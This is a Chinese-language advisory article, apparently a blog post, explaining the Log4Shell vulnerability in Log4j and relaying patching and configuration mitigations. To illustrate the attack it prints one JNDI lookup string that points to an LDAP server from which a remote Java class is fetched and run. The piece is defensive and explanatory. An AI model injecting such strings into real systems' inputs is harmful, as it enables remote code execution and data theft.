Log4j 漏洞如何对我们产生影响

Log4j可以说成为整个网络安全圈今年最大的瓜了。或者，今年整个漏洞全球的反映，甚至比2020年最大的solarwinds供应链攻击有过之而无不及。以下是IBM方面给出的修复环节方案。

补救更新：

  • 如果使用 Java 8，则必须升级到 2.17 以缓解CVE-2021-45105。

  • 如果使用 Java 8（或更高版本），则必须升级到 2.16 以修复CVE-2021-44228。

  • 不要在 2.16 或 2.17 中启用 JNDI。

  • 关注：https : //logging.apache.org/log4j/2.x/security.html

如果没有听说过 Apache Log4j，那么现在很可能会关注它。事实上，可能已经使用它多年了。Log4j 是一个日志库。想象一下，将日常活动写入笔记本。该笔记本是 Log4j。开发人员和程序员使用它来记录应用程序和服务器上发生的事情。例如，他们可能会使用它来解决安全事件，例如有人使用错误的密码登录应用程序。Log4j 可用于记录此人何时登录、他们使用的应用程序和密码。

Log4j 被过去十年中为服务器和客户端应用程序开发的 Java 程序的很大一部分使用。Java 也是企业使用的顶级编程语言之一。因此，2021 年 12 月 9 日，当阿里云安全团队发现 CVE-2021-44228，又名 Log4Shell，一个影响 Log4j 核心功能的高危漏洞，以及一个公开的漏洞利用时，网络安全研究人员发出了警告。

CVE 2021-44228 使攻击者能够执行远程代码执行，这意味着他们可以运行任何代码并访问受影响机器上的所有数据。它还允许他们删除或加密文件并扣押它们以索取赎金。受影响资产可以执行的任何功能，攻击者也可以利用漏洞执行。这意味着任何使用易受攻击的 Log4j 版本来记录用户控制数据的东西都可能受到攻击。


Log4j 允许记录的消息包含通过 Java 命名和目录接口 (JNDI) 引用外部信息的格式字符串。这允许通过各种协议远程检索信息，包括轻量级目录访问协议 (LDAP)。例如，当 Log4j 在日志消息中找到以下字符串时，它会指示 JNDI 向位于 192.168.1.1 的 LDAP 服务器询问“信息”对象。

${jndi:ldap://192.168.1.1/information}

按照设计，JNDI 将执行 LDAP 服务器引用的 Java 类。继续这个例子，如果 LDAP 服务器的响应引用 URL http://192.168.1.2/ information，JNDI 将自动从 Web 服务器请求文件information.class并执行响应。

由于日志消息的内容通常包含用户控制的数据，攻击者可以插入指向他们控制的 LDAP 服务器的 JNDI 引用，准备为执行他们选择的任何操作的恶意 Java 类提供服务。

CVE-2021-44228 会带来什么？

我们已经看到攻击者利用 CVE-2021-44228 的报告，这并不让我们感到惊讶。犯罪分子会发现这是一种非常有吸引力的攻击技术，因为 Log4j 很流行，程序通常在日志中包含用户提供的数据，而且补丁最近才发布。我们预计未来会发生更多攻击——勒索软件和其他攻击。

修补单个应用程序并不太复杂，但需要测试每个应用程序以验证补丁没有破坏任何内容。大型组织很容易在数千台设备上拥有数百个易受攻击的应用程序。

Apache 发布另一个新补丁

（来源：https : //logging.apache.org/log4j/2.x/security.html）

修补是第一个推荐的缓解步骤。Apache 在发现初始补丁仍然存在漏洞后，最近发布了几个补丁，主要是远程代码执行和拒绝服务攻击。根据 Apache 的最新更新，如果您使用 Java 8 或更高版本，则必须升级到 2.17。Apache 的缓解建议包括：

  • Java 8（或更高版本）用户应升级到 2.17.0 版。

或者，这可以在配置中缓解：

  • 在日志记录配置的 PatternLayout 中，用线程上下文映射模式（%X、%mdc 或 %MDC）替换 ${ctx:loginId} 或 $${ctx:loginId} 等上下文查找。

  • 否则，在配置中，删除对上下文查找的引用，如 ${ctx:loginId} 或 $${ctx:loginId}，它们源自应用程序外部的源，如 HTTP 标头或用户输入。

请注意，只有 log4j-core JAR 文件受此漏洞影响。仅使用 log4j-api JAR 文件而不使用 log4j-core JAR 文件的应用程序不受此漏洞的影响。另请注意，Apache Log4j 是唯一受此漏洞影响的日志服务子项目。Log4net 和 Log4cxx 等其他项目不受此影响。

除了修补 Log4j 或完全删除 JNDI 查找功能之外，之前建议的缓解措施不能缓解此漏洞。还建议不要在 2.17 中启用 JNDI。

在预防方面，设计具有强大网络安全控制的环境会有所帮助。例如，在设计良好的环境中，服务器只能创建到明确批准的目的地的网络连接。创建默认拒绝防火墙规则将防止服务器创建未经批准的连接，并有助于降低您被入侵的风险。这对于暴露于 Internet 的服务器尤其重要。

由于该漏洞的影响范围太深太广，我们要时刻关注着这方面的信息，以期将自家网络安全风险降到最低。
